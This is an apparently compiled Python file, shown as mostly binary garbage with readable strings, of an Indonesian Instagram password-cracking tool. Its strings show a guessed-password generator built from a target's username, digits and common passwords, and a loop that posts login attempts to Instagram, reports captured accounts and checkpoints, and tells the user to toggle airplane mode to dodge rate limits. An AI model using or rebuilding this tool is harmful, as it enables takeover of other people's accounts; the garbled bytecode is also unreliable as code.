					rQ  r�  r�   r�  z1Harap tunggu beberapa menit sebelum mencoba lagi.�D    [0m[[31m•[32m•[0m][0m terkena spam, aktifkan mode pesawat r�  r   )$r   r2  ra   rc   r   r�  r_   r`   r�   r�  r
   r   r   r�  rl   rJ  r�  r   r   r�   r�   r  r   r�   r�   r�   r�   r�   rV  r   r*   r{   r�  r  r   rR  )r�   r�   �pasrS  r�  r�  r�   r�   �paramro   r7  r�   rT  rU  r�   r   r   r   rR  �  s�   0


�����
���	�
���������������������������0
&zinstagram.crackAPIc                 C   s�  �zht jddt� id�j}t�dt|��d }t j�dddd	d
t	� d|dddddddd�� |d�
t�dd�|�di di d�}t jd|d�}td� t�|j�}d|jv r�| �|�\}}	}
}td�g d�t� �d�t� �d�t� �d �t� �d!�t� �d"�t� �|� �d#�t� �|� �d$�t� �d �t� �d%�t� �d"�t� �|	� �d#�t� �|
� �d$�t� �d �t� �d&�t� �d"�t� �|� �d'��� W d S d(|jv �rC| �|�\}}	}
}td�g d)�t� �d�t� �d*�t� �d �t� �d!�t� �d"�t� �|� �d#�t� �|� �d$�t� �d �t� �d+�t� �d"�t� �|	� �d#�t� �|
� �d$�t� �d �t� �d&�t� �d"�t� �|� �d'��� W d S d,t|j�v �rgtj�d-t� d.�� tj��  td/� | �||� W d S W d S    | �||� Y d S )0Nr   r�   r�   r!  r   rX  z5hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9hZ82a581bb9399rr  r#  r^  r\  r�  r]  r^  r_  rb  )Z	authorityzx-ig-www-claimzx-instagram-ajaxr�   r�   r�   rd  zx-csrftokenzx-ig-app-idrt  re  rf  rh  ri  r�   r`  ra  rb  Fr%   rc  rd  r�  r   re  z   
r�  z8[0mBerhasil Login \_>[32m Ok[0m                     
rf  � [0mUsername  r�   rg  r	   � [0mFollowers � [0mPostingan  z
				�checkpoint_urlz  
u   [0mCheckpoint ×
rh  zPlease wait a few minutesr  rj  r�  )r   r�   r  rH  r�   r�   r�   r�   rm   r  r  r   r   r�   r   r�   r�   r�   rV  r   r*   r�  rc   ra   r   r
   r   r   r   r?  )r�   r�   r�  r�   r6  rl  ro   r7  r�   rT  rU  r�   r   r   r   r?    s�   ��
������������������������������������������&�zinstagram.checkAPIN)r�   r�   r�   r�   r8  r�   rB  rC  r=  r:  r;  r<  rP  rV  rR  r?  r   r   r   r   r�  �  s    K56r�  c              
   C   s  z-t jdt dtid�}|�� d d }|d �d�a|d a|d	 d
 a|d d
 a	W d S  t j
jyT   |dkrEtdttf � Y d S tdtt|| |f � 	 Y d S  tyx   |dkritdttf � Y d S tdtt|| |f � 	 Y d S    tdtt|| |f � Y d S )Nr�  r�   r�   r�  r�   r�  r  r�   r�  r�  r�  r%   z&
%s%s[0m Tidak ada koneksi internet 
z %s%s %s : %s > %s             
z6
%s%s[0m IP anda terkena spam, mode pesawat 3 detik 
)r�   r�   r�   r�  r�   r  r�   Zid_rT  Z	mengikutir�   r   r-   ra   r~   r   r�   )Zusername_devZpass_devr�  ZdaZdata_us_devr   r   r   �infohhhG  s(   rq  c                  C   s�  d} d}g }g }t dtttttf �}t�d� tdtttf � t	|| |� t
�� }g d�}|�t
�dd�� |�t
� |D ]r}t|�dkrT|�t
�dd�t|� � t|�dkrm|D ]}|�|� |�|t|� � q\t|�dkr�|�|d |d  � |D ]}	|�|d |d  t|	� � q�|�|d |d  � |D ]}	|�|d |d  t|	� � q�q?|�|� t|�D ]}
t|
�d	kr�|�|
� q�g d
�}|D ]}|�|� q�tdtttf � td� t t||� t�  d S )Nr%   z"
%s%s %s[0mUsername target%s > %sr$   z%s%s%s [0mMohon tunggu ... )�{   i�  i90  r&   r   r   �   )rU  ZiloveyouZ	bismillahrV  ZbangsatZbajinganZrahasiaZ	katasandir  r   Z123456Z12345678Z	123456789z'%s%s%s [0mBerhasil membuat kata sandi )r,   r_   r~   r`   ra   r   r   r   rX   rq  r�   rk   r  ri   rl   r�   �setr   rW   rI  r-   )Zpw_noneZstatus_noneZ	word_listZword_list_crackZuser_targetZ
nama_pecahZangka�devZsub_devZdev_ZiqZpw_tambahanr,  r   r   r   r>  a  sN   


  �

�

r>  c                 C   s�  |D �]�}�z�|� � }t�� �E}td }d}d}d|i}|j|t |d�j}	t�dt	|	��d }
ddd	d
|
ddt
d�}| d�t�dd�|t�di di d�}W d   � n1 sWw   Y  ttd t	t� d t d t d t | d � t�� ��5}d}|j|t t ||d�}t�|j�}t�td�}dt	|�v �rtd�g t� �d�t� �d�t� �d�t� �d�t� �d �t� �t� �d!�t� �t� �d"�t� �d�t� �d#�t� �d �t� �t� �d!�t� �t� �d"�t� �d�t� �d$�t� �d �t� �t � �d%��� 	 W d   � W  d S d&t	|�v �r�td�g t� �d�t� �d'�t� �d(�t� �d�t� �d�t� �d �t� �t� �d!�t� �t� �d"�t� �d�t� �d#�t� �d �t� �t� �d!�t� �t� �d"�t� �d�t� �d$�t� �d �t� �t � �d%��� 	 W d   � W  d S d)t	|�v �r�td*tt!f � |�"� }t#| |� n	 t$d+7 a$W d   � n	1 �s�w   Y  W q tj%j&�y�   |�"� }t#| |� Y q t'�y�   t(d,tt!f � Y q   Y qd S )-Nr   r   r�  r+  r�   rF  r#  rZ  zen-US,en;q=0.5rX  r^  rW  )r)  rY  r*  r�   r[  r]  r_  r+  z #PWD_INSTAGRAM_BROWSER:0:{}:{}{}ra  rb  Fr%   rc  r&   �.z	 passwordz > z                rd  )r\   r�   rp  z*--> r�  rf  rm  r�   rg  r	   rn  ro  ri  re  z[0mBerhasil Login \_> zOk                     
zPlease waitz#%s%s [0mMode pesawatkan 2 detik  r   z%s%s [0mKeluar....))r*  r�   r�  �qr�   Zpost_rH  r�   r�   r�   Zuser_agentzr  r   r   r�   r   r�   r   r`   ra   r   r�   r�   r�   ri   r*   r�  rc   r�   r�  rT  rU  r�   r~   rk   rI  �loopingr�   r   r�  r-   )Z	email_devZsan_dev_Z	san_dev_1Zsan_devru  rk  Z	url_scrapZuser_agentz_apiZheaderzr\   r6  Zheaderrl  Zses_devr�   r  Zdata_devr�  Zsan_dev_splitr   r   r   rI  �  s�   

&�4	��������������������&������������������������rI  �__main__)�r   r�   r
   r   r�   r   r�   Zconcurrent.futuresr   Zrequests.exceptionsr   r   r�  rA  r   r   �versionZbuffer_sizer)   r+   r   r   r   r   r4   Zreq�
subprocess�platformr�  �ImportErrorr   Zrich.markdownr6   Zrich.consoler7   r�  r�  r�  r�  Z
concurrentZcatet_futurZftr'  Zcatet_bsr�  Z	mechanizeZ	catet_mekZmekar�  Z
catet_maskZmaskr{   �devnullZbff_2ZcallZSTDOUTZmy_musicr"  Z
catet_playZplayZMrZHjZMtZshutilr    Zlogging�base64Zhmacr  r2  Zurllib.requestr  r<   r  Z	threadingr=   r>   rW   r'   Zctr�  �nZbulan_r-   ZnTempr�   Zcurrentr�  ZhariZbulanr�  ZtahunZbullanr�  ra   rc   r   r�  r_   r`   r�   r�  r�   Zacakr2  r�  r~   rE  rF  r�   r�   rP  r�  r   r   rX   r^   r�   r�   re   Zdtrb   rd   r�   rf   rq   r�   r�   r�   r�   r�   r�   r3  r6  r4  r�   r�  r�  ZpwBaruZubahPrD  r�  r�   r�  r\   r�  r�  r�  r�  r�   r�  r�  r(   r@  rA  Z	insta_logr�   r�  rJ  r�  r�  r�   r�  r�  r   r4  Zurllib_quote_plusZparseZ
quote_plusr�  r�   r  r  r�  r�  r�  rx  rq  r>  rI  r�   r   r   r   r   �<module>   s�  80 ������

p0
�
�	!
,   4&  ^2$J5'

	C  j'
2